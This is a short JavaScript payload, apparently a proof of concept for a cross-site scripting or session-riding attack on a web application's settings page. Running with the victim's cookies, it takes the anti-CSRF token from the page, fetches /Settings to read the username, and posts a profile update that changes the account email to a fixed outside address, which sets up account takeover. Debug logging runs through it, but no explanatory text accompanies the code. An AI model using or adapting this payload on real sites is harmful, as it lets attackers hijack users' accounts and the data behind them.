(async () => {
  try {
    console.log("start");

    const token =
      document.querySelector('input[name="__RequestVerificationToken"]')?.value;
    console.log("token:", token);

    if (!token) {
      console.error("missing token");
      return;
    }

    console.log("before GET /Settings");
    const r = await fetch("/Settings", { credentials: "include" });
    console.log("GET status:", r.status);

    const html = await r.text();
    console.log("html length:", html.length);

    const doc = new DOMParser().parseFromString(html, "text/html");
    const username =
      doc.querySelector("#ProfileInfo_LoginName-input")?.value ||
      doc.querySelector('input[name="ProfileInfo.LoginName"]')?.value;

    console.log("username:", username);

    console.log("before second request");

    const fd = new FormData();
    fd.append("ProfileInfo.Email", "trey@inspectiv.com");
    fd.append("__RequestVerificationToken", token);

    console.log("before POST");
    const r2 = await fetch("/Settings?handler=UpdateProfileInfo", {
      method: "POST",
      credentials: "include",
      headers: {
        "X-Requested-With": "XMLHttpRequest"
      },
      body: fd
    });

    console.log("POST status:", r2.status);
    console.log("POST body:", await r2.text());
  } catch (e) {
    console.error("top-level error:", e);
  }
})();
